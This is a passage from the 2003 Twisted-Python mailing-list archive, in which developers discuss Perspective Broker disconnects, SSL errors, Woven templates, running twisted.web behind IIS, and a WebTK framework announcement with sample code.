From andrew-twisted at puzzling.org  Mon Jul 21 17:41:15 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 09:41:15 +1000
Subject: [Twisted-Python] getObjectAtSSL: Exception
In-Reply-To: <3F1C5E94.8050103@is.lg.ua>
References: <3F1C5E94.8050103@is.lg.ua>
Message-ID: <20030721234115.GK10749@frobozz>

On Tue, Jul 22, 2003 at 12:43:48AM +0300, Ruslan Spivak wrote:
> Hello!
> 
> Here is the simple server:
> 
[...]
> AttributeError: 'int' object has no attribute 'getContext'
> 
> What's wrong?
> Your help is very appreciated. Thanks in advance.

This was fixed in CVS a week or so ago -- try using the 1.0.7 alpha release,
which should have the fix for that.

I'm not sure if that's likely to help your second problem or not, though.
One tip though: *always* add errbacks to your deferreds, e.g.:

    from twisted.python import log
    d.addErrback(log.err)

Silently ignored errors due to lack of errbacks is a very common cause of
mysterious hangs.

I hope this helps,

-Andrew.




From andrew-twisted at puzzling.org  Mon Jul 21 18:45:40 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 10:45:40 +1000
Subject: [Twisted-Python] Re: [Twisted-commits] callWhenRunning interface and implementation
In-Reply-To: <E19ejaQ-0000Ck-00@pyramid.twistedmatrix.com>
References: <E19ejaQ-0000Ck-00@pyramid.twistedmatrix.com>
Message-ID: <20030722004540.GA29030@frobozz>

On Mon, Jul 21, 2003 at 05:56:54PM -0500, davep CVS wrote:
> Modified files:
> Twisted/ChangeLog 1.429 1.430
> Twisted/twisted/internet/base.py 1.58 1.59
> Twisted/twisted/internet/interfaces.py 1.88 1.89
> 
> Log message:
> callWhenRunning interface and implementation
[...]
> +++ Twisted/twisted/internet/interfaces.py	Mon Jul 21 17:56:22 2003
[...]
> @@ -589,6 +589,23 @@
>          """Removes a trigger added with addSystemEventTrigger.
>  
>          @param triggerID: a value returned from addSystemEventTrigger.
> +        """
> +
> +    def callWhenRunning(self, callable, *args, **kw):
> +        """Call a function when the reactor is running.
> +
> +        If the reactor has not started, the callable will be scheduled
[...]

I wonder, when we add methods to stable interfaces, if we should put a note
in the docstrings of those methods saying something like "New in 1.0.7"?

-Andrew.




From dave at krondo.com  Mon Jul 21 19:15:36 2003
From: dave at krondo.com (Dave Peticolas)
Date: 21 Jul 2003 18:15:36 -0700
Subject: [Twisted-Python] Re: [Twisted-commits] callWhenRunning
	interface and implementation
In-Reply-To: <20030722004540.GA29030@frobozz>
References: <E19ejaQ-0000Ck-00@pyramid.twistedmatrix.com>
	 <20030722004540.GA29030@frobozz>
Message-ID: <1058836536.18662.15.camel@oneiros>

On Mon, 2003-07-21 at 17:45, Andrew Bennetts wrote:
...
> I wonder, when we add methods to stable interfaces, if we should put a note
> in the docstrings of those methods saying something like "New in 1.0.7"?

Probably a good idea, but I'm going to wait to add it to this
one since, after discussion with Itamar, it may come right back
out.

dave

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 189 bytes
Desc: This is a digitally signed message part
URL: </pipermail/twisted-python/attachments/20030721/a7488f7a/attachment.sig>

From uwe at oss4u.com  Mon Jul 21 19:21:05 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Mon, 21 Jul 2003 18:21:05 -0700
Subject: [Twisted-Python] Explicit disconnect from pb
Message-ID: <200307211821.05919.uwe@oss4u.com>

Hi,

I looked qround, but I can't find any information on how to disconnect from a 
pb session without ending the client.

I have a service which I'm connecting to. Some time later I want to disconnect 
from this service to free up ressources ( the service keeps database 
connections etc, and I want to get rid of them ).
The only thing I have on the client side is a remotereference to the 
perspective instance. So how do I disconnect from something I don't have a 
reference to ? Somehow there must be something I can call to disconnect the 
session (and on the server side trigger the disconnect handlers)

TIA

	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From illumen at yahoo.com  Mon Jul 21 19:29:30 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 22 Jul 2003 11:29:30 +1000
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
Message-ID: <3F1C937A.1070506@yahoo.com>

David A. Leedom wrote:

> I am new to Twisted Matrix.
>
> I am trying to setup an mail system that will use a database as the 
> datastore for emails, domains and user access (both pop3/imap and stmp).
>
> What I am looking for is a code snipit example of how to setup a POP3 
> and SMTP server using frame work without using the TAP utility.
>
> I figure once I have this example then I can begin to understand the 
> documentation better.  There is something missing in the explanation 
> of how things work.  It just goes over my head.
>
> Thanks You,
>
> Dave Leedom
>

Have a look at the tap code in the mail/tap.py for mail.  Other tap 
files are in the tap/ directory of twisted.  That's how I figured out 
how to use the gtk manhole without using taps.

If anyone has spare time, making the adding/removing of servers simpler 
from code without using taps would be nice :)  Maybe a functional api 
which matches the tap utility?







From andrew-twisted at puzzling.org  Mon Jul 21 19:35:53 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 11:35:53 +1000
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <200307211821.05919.uwe@oss4u.com>
References: <200307211821.05919.uwe@oss4u.com>
Message-ID: <20030722013553.GB29030@frobozz>

On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> 
> Hi,
> 
> I looked qround, but I can't find any information on how to disconnect from a 
> pb session without ending the client.
> 
> I have a service which I'm connecting to. Some time later I want to disconnect 
> from this service to free up ressources ( the service keeps database 
> connections etc, and I want to get rid of them ).
> The only thing I have on the client side is a remotereference to the 
> perspective instance. So how do I disconnect from something I don't have a 
> reference to ? Somehow there must be something I can call to disconnect the 
> session (and on the server side trigger the disconnect handlers)

This sounds related to this bug:
    http://twistedmatrix.com/bugs/issue62

-Andrew.




From uwe at oss4u.com  Mon Jul 21 19:47:04 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Mon, 21 Jul 2003 18:47:04 -0700
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <20030722013553.GB29030@frobozz>
References: <200307211821.05919.uwe@oss4u.com> <20030722013553.GB29030@frobozz>
Message-ID: <200307211847.04954.uwe@oss4u.com>

On Monday 21 July 2003 06:35 pm, Andrew Bennetts wrote:
> On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> > Hi,
> >
> > I looked qround, but I can't find any information on how to disconnect
> > from a pb session without ending the client.
> >
> > I have a service which I'm connecting to. Some time later I want to
> > disconnect from this service to free up ressources ( the service keeps
> > database connections etc, and I want to get rid of them ).
> > The only thing I have on the client side is a remotereference to the
> > perspective instance. So how do I disconnect from something I don't have
> > a reference to ? Somehow there must be something I can call to disconnect
> > the session (and on the server side trigger the disconnect handlers)
>
> This sounds related to this bug:
>     http://twistedmatrix.com/bugs/issue62

Yep, sound like it.
What I just tried ( and what partially works, at least for my purpose) is to 
have a perspective_disconnect method in the perspective class which just 
free's up the ressources I want to get rid of. certainly the connection still 
hangs around until I close the client. I my case droping the database 
connection which is no longer in use is more of a concern, so that works for 
me. (each client opens 2 database connections at startup - one is solely for 
login and gui definitions and has no password, the second is started after 
login. Therefor I don't need the first connection anymore. But I need to 
close the db connection since this server is intended to serve possibly up to 
500 clients at a time, which would be 500 useless db connections)

	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From dizzyd at jabber.org  Mon Jul 21 21:07:52 2003
From: dizzyd at jabber.org (Dave Smith)
Date: Mon, 21 Jul 2003 21:07:52 -0600
Subject: [Twisted-Python] Connector Inconsistency
Message-ID: <AE98B9B6-BBF1-11D7-B329-00039386381C@jabber.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Greetings,

In talking with Itamar, the question came up of how to correctly 
shutdown a Connector. For example:

c = reactor.connectTCP(host, port, factory)
c.loseConnection() # ?!
# or
c.stopConnecting() # ?!

It is not codified anywhere that "loseConnection" will shutdown the 
connection, even if the connection is pending. As it stands now, you 
could call c.stopConnecting() or c.loseConnection(). The "correct" one 
to call is impossible to diagnose, as I can find no calls which 
indicate the state (in terms of connection) of the Connector. As such, 
I would suggest we drop the "stopConnecting" call and set it in stone 
that loseConnection() will do the Right Thing and stop connecting if in 
progress.

Any objections or alternatives?

Diz
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.1 (Darwin)

iD8DBQE/HKqIYNE3chVHHsMRAvXoAKCzIMtOg8BaoiZrNbQnv9m2LZk6IACfWu8/
1r1FgHsmQp1hZQK/KogLHlk=
=Zb5b
-----END PGP SIGNATURE-----




From radix at twistedmatrix.com  Mon Jul 21 21:12:21 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Mon, 21 Jul 2003 23:12:21 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <3F1C937A.1070506@yahoo.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <3F1C937A.1070506@yahoo.com>
Message-ID: <20030722031221.GB1189@radii>

On Tue, Jul 22, 2003 at 11:29:30AM +1000, Rene Dudfield wrote:
> If anyone has spare time, making the adding/removing of servers simpler 
> from code without using taps would be nice :)  Maybe a functional api 
> which matches the tap utility?

Well, there's no reason you can't do 

  from twisted.tap import web
  web.updateApplication(app, conf)

yourself. And if you don't have an actual usage.Options instance to
pass as `conf', you can probably just use a dictionary.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From radix at twistedmatrix.com  Mon Jul 21 21:18:34 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Mon, 21 Jul 2003 23:18:34 -0400
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <200307211821.05919.uwe@oss4u.com>
References: <200307211821.05919.uwe@oss4u.com>
Message-ID: <20030722031834.GC1189@radii>

On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> 
> Hi,
> 
> I looked qround, but I can't find any information on how to disconnect from a 
> pb session without ending the client.

You can call ref.broker.transport.loseConnection(), IIRC.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From illumen at yahoo.com  Mon Jul 21 22:00:33 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 22 Jul 2003 14:00:33 +1000
Subject: [Twisted-Python] Mail Server
In-Reply-To: <20030722031221.GB1189@radii>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <3F1C937A.1070506@yahoo.com> <20030722031221.GB1189@radii>
Message-ID: <3F1CB6E1.4080703@yahoo.com>

Christopher Armstrong wrote:

>On Tue, Jul 22, 2003 at 11:29:30AM +1000, Rene Dudfield wrote:
>  
>
>>If anyone has spare time, making the adding/removing of servers simpler 
>>from code without using taps would be nice :)  Maybe a functional api 
>>which matches the tap utility?
>>    
>>
>
>Well, there's no reason you can't do 
>
>  from twisted.tap import web
>  web.updateApplication(app, conf)
>
>yourself. And if you don't have an actual usage.Options instance to
>pass as `conf', you can probably just use a dictionary.
>
>  
>
excellent :)




From illumen at yahoo.com  Mon Jul 21 22:11:02 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 22 Jul 2003 14:11:02 +1000
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <200307211847.04954.uwe@oss4u.com>
References: <200307211821.05919.uwe@oss4u.com> <20030722013553.GB29030@frobozz> <200307211847.04954.uwe@oss4u.com>
Message-ID: <3F1CB956.5010104@yahoo.com>

Uwe C. Schroeder wrote:

>On Monday 21 July 2003 06:35 pm, Andrew Bennetts wrote:
>  
>
>>On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
>>    
>>
>>>Hi,
>>>
>>>I looked qround, but I can't find any information on how to disconnect
>>>from a pb session without ending the client.
>>>
>>>I have a service which I'm connecting to. Some time later I want to
>>>disconnect from this service to free up ressources ( the service keeps
>>>database connections etc, and I want to get rid of them ).
>>>The only thing I have on the client side is a remotereference to the
>>>perspective instance. So how do I disconnect from something I don't have
>>>a reference to ? Somehow there must be something I can call to disconnect
>>>the session (and on the server side trigger the disconnect handlers)
>>>      
>>>
>>This sounds related to this bug:
>>    http://twistedmatrix.com/bugs/issue62
>>    
>>
>
>Yep, sound like it.
>What I just tried ( and what partially works, at least for my purpose) is to 
>have a perspective_disconnect method in the perspective class which just 
>free's up the ressources I want to get rid of. certainly the connection still 
>hangs around until I close the client. I my case droping the database 
>connection which is no longer in use is more of a concern, so that works for 
>me. (each client opens 2 database connections at startup - one is solely for 
>login and gui definitions and has no password, the second is started after 
>login. Therefor I don't need the first connection anymore. But I need to 
>close the db connection since this server is intended to serve possibly up to 
>500 clients at a time, which would be 500 useless db connections)
>
>	UC
>  
>

I was asking a very similar question yesterday on irc.

My problem was if a client connects to the server and does nothing, how 
do I disconnect it if I want to(from the server).

Radix came up with the suggestion of
"""
best idea I can think of is to only put a single method on your Root 
object which returns a Referenceable that has your "real" client interface
...
 implement a remote_login(self, clientobj) method on your pb.Root that 
returns a Referenceable that actually gives access to your app
...
 the client will need to implement a small Referenceable that implements 
`remote_ping' and it needs to pass it to that `login' method on the Root 
so it can get back the app interface object
"""

That still doesn't allow you to take care of misbehaving clients which 
never make calls.  But it should allow you do disconnect clients which 
log in.  As it will allow you to ping it over pb occasionally to make 
sure it is still there.







From uwe at oss4u.com  Mon Jul 21 22:32:50 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Mon, 21 Jul 2003 21:32:50 -0700
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <20030722031834.GC1189@radii>
References: <200307211821.05919.uwe@oss4u.com> <20030722031834.GC1189@radii>
Message-ID: <200307212132.50173.uwe@oss4u.com>

On Monday 21 July 2003 08:18 pm, Christopher Armstrong wrote:
> On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> > Hi,
> >
> > I looked qround, but I can't find any information on how to disconnect
> > from a pb session without ending the client.
>
> You can call ref.broker.transport.loseConnection(), IIRC.

Thanks, that does the trick.


-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From domma at procoders.net  Tue Jul 22 02:35:55 2003
From: domma at procoders.net (Achim Domma (ProCoders))
Date: Tue, 22 Jul 2003 10:35:55 +0200
Subject: [Twisted-Python] twisted.web with IIS
Message-ID: <FCEMIEFBFOIDAOJDEPIAOEGLFNAA.domma@procoders.net>

Hi,

I have to develop a small app on Win2K with IIS. I want to use twisted.web,
but it seems like IIS has nothing like ProxyPass. Does anybody know a simple
solution to let twisted.web run behind IIS?

regards,
Achim




From dp at twistedmatrix.com  Tue Jul 22 03:57:57 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Tue, 22 Jul 2003 02:57:57 -0700
Subject: [Twisted-Python] twisted.web with IIS
In-Reply-To: <FCEMIEFBFOIDAOJDEPIAOEGLFNAA.domma@procoders.net>
References: <FCEMIEFBFOIDAOJDEPIAOEGLFNAA.domma@procoders.net>
Message-ID: <F8D3B93C-BC2A-11D7-9EE7-000A95864FC4@twistedmatrix.com>

On Tuesday, July 22, 2003, at 1:35AM, Achim Domma ((ProCoders)) wrote:

> I have to develop a small app on Win2K with IIS. I want to use 
> twisted.web,
> but it seems like IIS has nothing like ProxyPass. Does anybody know a 
> simple
> solution to let twisted.web run behind IIS?

I apologize if I'm wrong, but I believe IIS has something called 
"Virtual Directories" which act similarly to proxypass. I don't have my 
win2k machine in front of me so I can't give you more details, but a 
quick google search might help you out.

dp




From domma at procoders.net  Tue Jul 22 06:10:15 2003
From: domma at procoders.net (Achim Domma (ProCoders))
Date: Tue, 22 Jul 2003 14:10:15 +0200
Subject: [Twisted-Python] twisted.web with IIS
In-Reply-To: <F8D3B93C-BC2A-11D7-9EE7-000A95864FC4@twistedmatrix.com>
Message-ID: <FCEMIEFBFOIDAOJDEPIAKEHFFNAA.domma@procoders.net>

> I apologize if I'm wrong, but I believe IIS has something called
> "Virtual Directories" which act similarly to proxypass. I don't have my
> win2k machine in front of me so I can't give you more details, but a
> quick google search might help you out.

I did a google search and found the solution with 'virtual directories', but
it seems to be a simple redirect, so the user can see, that he is redirected
to another url. I want to have a transparent solution like apaches one.

Achim




From justinjohnson at fastmail.fm  Tue Jul 22 07:11:27 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 07:11:27 -0600
Subject: [Twisted-Python] woven not replacing model/view tags
Message-ID: <20030722131127.CE7D83928A@www.fastmail.fm>

Hi,

I'm trying out woven, but my tags that include model and view attributes
aren't being replaced as I would expect them to.  I've attached index.rpy
and index.html, which are the only files from the code that are being
used at this point.  I'm running them with the following...

mktap web --path C:\share\woven\site
twistd -nf web.tap

It starts up fine and renders the html of index.html just fine, but my
tags are replaced, and the title is set to the actual tag (i.e.
everything I placed between <title> and </title>.

Anybody see what I'm doing wrong?

Thanks much.
-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: index.rpy
Type: application/unknown
Size: 1071 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030722/e2ef6620/attachment-0002.bin>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030722/e2ef6620/attachment-0002.html>

From justinjohnson at fastmail.fm  Tue Jul 22 07:48:51 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 07:48:51 -0600
Subject: [Twisted-Python] woven not replacing model/view tags
In-Reply-To: ARRAY(0x9d740fc)
References: ARRAY(0x9d8b5a4)
Message-ID: <20030722134851.3D26738889@www.fastmail.fm>

Never mind, I figured it out.  There were 2 problems.

1)  I had index.html and index.rpy sitting in the same directory, so
index.html was being picked up first, and of course rendering the way it
should for a .html file.

2)  Once I referenced index.rpy directly I found my html was not correct,
not having all the necessary double quotes around attribute values and
missing some tailing />'s for my tags.

-Justin

On Tue, 22 Jul 2003 07:11:27 -0600, "Justin Johnson"
<justinjohnson at fastmail.fm> said:
> Hi,
> 
> I'm trying out woven, but my tags that include model and view attributes
> aren't being replaced as I would expect them to.  I've attached index.rpy
> and index.html, which are the only files from the code that are being
> used at this point.  I'm running them with the following...
> 
> mktap web --path C:\share\woven\site
> twistd -nf web.tap
> 
> It starts up fine and renders the html of index.html just fine, but my
> tags are replaced, and the title is set to the actual tag (i.e.
> everything I placed between <title> and </title>.
> 
> Anybody see what I'm doing wrong?
> 
> Thanks much.
> -Justin



From lists at gregfortune.com  Tue Jul 22 10:32:21 2003
From: lists at gregfortune.com (Greg Fortune)
Date: Tue, 22 Jul 2003 09:32:21 -0700
Subject: [Twisted-Python] quick factory question
Message-ID: <200307220932.21459.lists@gregfortune.com>

Factories produce instances of protocols, correct?  And if I've created a 
single instance of a factory, I shouldn't have to worry about the app 
spawning more factories for any reason, correct?  I ask because I am holding 
some global mutex info in my factory that changes the behavior of the 
protocol instances and if multiple factories were running at any given time, 
I could have some huge concurency problems...

On a related note, I've noticed that twisted uses naming similar to that of 
the Designs pattern books.  Anyone know of a good online resource for the 
design patterns covered by "the gang of four" (ie, the ones twisted appears 
to be using...)?

Thanks,

Greg




From itamar at itamarst.org  Tue Jul 22 10:38:29 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 22 Jul 2003 12:38:29 -0400
Subject: [Twisted-Python] quick factory question
In-Reply-To: <200307220932.21459.lists@gregfortune.com>
References: <200307220932.21459.lists@gregfortune.com>
Message-ID: <20030722123829.739ae1d6.itamar@itamarst.org>

On Tue, 22 Jul 2003 09:32:21 -0700
Greg Fortune <lists at gregfortune.com> wrote:

> On a related note, I've noticed that twisted uses naming similar to
> that of the Designs pattern books.  Anyone know of a good online
> resource for the design patterns covered by "the gang of four" (ie,
> the ones twisted appears to be using...)?

The "gang of four" patterns are usually idioms in Python, so their book
is not very interesting.

For networking-oriented patterns you should probably look at
http://www.cs.wustl.edu/~schmidt/ACE-papers.html

You may want to read the POSA2 book as well, since it is based on these
papers.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Tue Jul 22 10:46:19 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 22 Jul 2003 10:46:19 -0600
Subject: [Twisted-Python] another woven question
Message-ID: <20030722164619.D654E39468@www.fastmail.fm>

I have a file index.html that has a table with sections for a menu,
header, footer, and body.  I want the contents of each section to come
from its own template file.  Since I want them to come from a template
file, it seems to me that I would subclass Page which has templateFile
and templateDirectory attributes, but I'm not sure how to insert the
contents into the index.html file.  I coded the attached index.rpy and
index.html, which I'm pretty sure is incorrect, but it *does* insert the
*first* tag of each respective .html file into index.html's final
rendering, but never goes beyond the first tag.  Actually it errors if I
just put plain text in the file with no tags.

I've been reading the documentation, but there's a lot to sift through. 
Can someone please tell me what the right way to do this is?

Thanks.
-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: index.rpy
Type: application/unknown
Size: 1162 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0002.bin>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0010.html>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0011.html>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0012.html>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0013.html>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030722/be29b4cd/attachment-0014.html>

From xavier at plebia.org  Tue Jul 22 10:47:07 2003
From: xavier at plebia.org (Xavier Antoviaque)
Date: Tue, 22 Jul 2003 18:47:07 +0200
Subject: [Twisted-Python] Fw: [assemblee] [ANN] WebTK v0.alpha3
Message-ID: <20030722184707.78c587ef.xavier@plebia.org>

Hello,

I saw Moshe Zadka at the EuroPython, who said me to drop a word about
WebTK here. So, I forward you the announcement for the alpha3 version.

Thanks for the quality of your work on Twisted, guys.



Begin forwarded message:

Date: Tue, 22 Jul 2003 17:39:41 +0200
From: Xavier Antoviaque <xavier at plebia.org>
To: python-announce at python.org
Cc: assemblee at plebia.org
Subject: [assemblee] [ANN] WebTK v0.alpha3


 =================
  WebTK v0.alpha3
 =================

Find a new alpha-release of WebTK:

    http://www.webtk.org/

It includes a brand new data model (featuring data events!), a Forum
application and a refactored module architecture. The examples below
have been updated to reflect changes.


What is WebTK ?
===============

WebTK is a Python framework, using Twisted as its underlying Web server,
and allowing webmasters to develop websites like any classic GUI
software. It is object-oriented, providing and handling event-based
widgets. It also does not need any database to work, as it uses objects
persitance, with the help of PyPerSyst.


Disclaimer
==========

Please note that the alpha series are mainly for developers that want to
have a look at WebTK internals - there are plenty of bugs, dirty tricks
and the installation is not easy. This is NOT for production websites.


URLs
====

You can find more about WebTK here :

Homepage    : http://www.webtk.org/
Download    : http://www.webtk.org/download/
Web CVS     : http://cvs.plebia.org/index.py/?cvsroot=webtk
Current API : http://www.webtk.org/doc/current/api/
Changelog   : http://www.webtk.org/Changelog


Examples
========

To give you some idea of what WebTK is, here is some small sample
websites, working with the alpha3 version. It shows an image whose
content change each time you click on it:

# Modules
#################################################################

import sys
from webtk.core.system import Session
from webtk.widget.window import RootWindow
from webtk.widget.display import Pixmap

# Classes
#################################################################

class MySession(Session):
    def init(self):
        window = RootWindow(wtkTitle='WebTK Test')
        self.wtkAddRootObject(window)

        image = PlebiaPlonePixmap()
        window.wtkAppendChild(image)


class PlebiaPlonePixmap(Pixmap):
    def init(self):
        self.ploneURI = 'http://plone.org/logo.jpg'
        self.plebiaURI = 'http://www.plebia.org/images/logo.png'

        self.wtkURI = self.plebiaURI
        self.wtkAddEvent('click', self.onClick)

    def onClick(self):
        if self.wtkURI == self.plebiaURI:
            self.wtkURI = self.ploneURI
        else:
            self.wtkURI = self.plebiaURI


Here is a slighlty more elaborated one, which uses a Poll widget to ask
the visitor an important question !

# Modules
#################################################################

import sys
from webtk.core.system import Session
from webtk.widget.window import RootWindow
from webtk.widget.app.poll import Poll, PollResult
from webtk.data.base import Data

# Classes
#################################################################

class MySession(Session):
    def init(self):
        # Poll
        window = RootWindow(wtkTitle='WebTK Test Poll')
        self.wtkAddRootObject(window)

        pollData = self.wtkSystem.wtkPoolGet('poll')
        if pollData is None:
            pollData = self.wtkSystem.wtkPoolRegister('poll', Data)

            question = Data()
            question.wtkTitle = 'Do you like WebTK ?'
            for ans in ['Yes, sure.', 'Mmmh, I do not know.', 'Bah!']:
                answer = Data()
                answer.wtkTitle = ans
                answer.wtkNbVotes = 0
                question.wtkAppendChild(answer)
            pollData.wtkAppendChild(question)

            question = Data()
            question.wtkTitle = 'Will you use it ?'
            for ans in ['For all my future websites!', 'Perhaps...',
'Never!']:
                answer = Data()
                answer.wtkTitle = ans
                answer.wtkNbVotes = 0
                question.wtkAppendChild(answer)
            pollData.wtkAppendChild(question)

        pollResult = PollResult(wtkPollData=pollData)
        pollResult.wtkIsVisible = 0

        poll = TestPoll(wtkPollData=pollData, pollResult=pollResult)

        window.wtkAppendChild(poll)
        window.wtkAppendChild(pollResult)


class TestPoll(Poll):
    def init(self, pollResult):
        self.pollResult = pollResult
        self.wtkAddEvent('onSelectAnswer',
self.wtkCallbackOnSelectAnswer)

    def wtkCallbackOnSelectAnswer(self):
        self.pollResult.wtkIsVisible = 1

-- 
Xavier.

---------------------------------------------------------------------
To unsubscribe, e-mail: assemblee-unsubscribe at plebia.org
For additional commands, e-mail: assemblee-help at plebia.org




-- 
Xavier.



From pradu at pradu.it  Tue Jul 22 10:48:07 2003
From: pradu at pradu.it (Alessandro Praduroux)
Date: Tue, 22 Jul 2003 18:48:07 +0200
Subject: [Twisted-Python] t.w.w.form maybe bug?
Message-ID: <200307221848.07645.pradu@pradu.it>

Hello, 
I am trying to create a page with a list of elements that can be possibly 
edited by the user, along with a form to edit the elements or insert new 
ones.

So, I setup the things as follows:

class Test(page.Page)
    template = """
<html>
<head></head>
<body>
        <table border="1" cellpadding="2" width="80%" model="configs" 
view="List">
            <tr 
pattern="listHeader"><th>&nbsp;</th><th>Nome</th><th>Limiti</th><th>Bilanciamento</th></tr>
            <tr pattern="listItem" view="conf"></tr>
        </table>
        <div><form method="POST" action="/balancing/edit" 
model="editform"></form></div>
</body>
</html>
""" 
    def wmfactory_configs(self, request):
        cf = libra.RouteConfig()
        return cf.configurations()

    def wmfactory_editform(self, request):
        return self._form

    def wchild_edit(self, request):
        fp = form.FormProcessor(self._form, callback=lambda x: 
util.Redirect("/balancing"))
        fp.mangle_timein = fp.mangle_multi
        return fp

    def wvupdate_conf(self, request, node, data):
        r = microdom.lmx(node)
        d = r.td()
        d.a(href="/balancing/?action=edit&cfg=%s"%data[0]).text("Modifica")
        d.br()
        d.a(href="/balancing/?action=delete&cfg=%s"%data[0]).text("Elimina")
        r.td().text(data[0])
        ((h0,m0,s0),(h1,m1,s1)) = data[1]["limit"]
        r.td().text("dalle %02d:%02d:%02d alle 
%02d:%02d:%02d"%(h0,m0,s0,h1,m1,s1))

        bl = ["%s: %d%%"%(k,v) for (k,v) in data[1]["weights"]]
        d = r.td()
        for l in bl:
            d.text(l)
            d.br()

    def setUp(self, request, d):
        self._action = request.args.get("action",[""])[0]

        if self._action == "delete":
            cf = libra.RouteConfig()
            cf.delCfg(request.args.get("cfg",[""])[0])
            cf.save()

        if self._action == "edit":
            cf = libra.RouteConfig()
            c = cf.getCfg(request.args.get("cfg",[""])[0])
            args = [
                fm.Hidden("action","edit"),
                lw.Static("Nome",request.args.get("cfg",[""])[0]),
                lw.Static("Dalle","%02d:%02d%02d"%c['limit'][0]),
                lw.Static("Alle","%02d:%02d%02d"%c['limit'][1]),
                ]

            for (k,v) in c["weights"]:
                args.append(fm.String(k, str(v)))

            cfs = fm.MethodSignature(*args)
            self._form = cfs.method(self.processEdit)
        else:
            cfs = fm.MethodSignature(
                fm.Hidden("action","new"),
                fm.String("Nome"),
                lw.Timein("Dalle",(00,00,00)),
                lw.Timein("Alle",(23,59,59))
                )
            self._form = cfs.method(self.processEdit)

    def processEdit(self,**kw):
        if kw["action"] == "new":
            print "new", kw
        else:
            print "edit", kw

one thing to notice: the page is not part of an .rpy, but it's added as child 
of the root page using putChild

The first time the page is rendered, i get the form I espect (the second one 
defined in setUp).

If I follow a link that should end up with the first form displayed, nothing 
happens (better, I am presented with the same form again and again).

digging into t.w.w.form.FormFillerWidget, I notice the following (around line 
280):
	argList = self.model.fmethod.getArgs()

That means the widget is rendered using the model it was built with, not the 
model that is passed in setUp(self, request, node, data)

Now the questions:
	
1. I am doing things really wrong here?
2. the fact that the render-time model is completely ignored is by design or a 
bug?
3. would changing the line above to read "argList = data.getArgs()" really 
solve the issue (here it seems to work) or it will introduce some subtle bugs 
I'm not aware of?

Thanks in advance for the help

-- 
Linux webmaster & sysadmin
pradu at pradu.it




From lists at gregfortune.com  Tue Jul 22 11:23:06 2003
From: lists at gregfortune.com (Greg Fortune)
Date: Tue, 22 Jul 2003 10:23:06 -0700
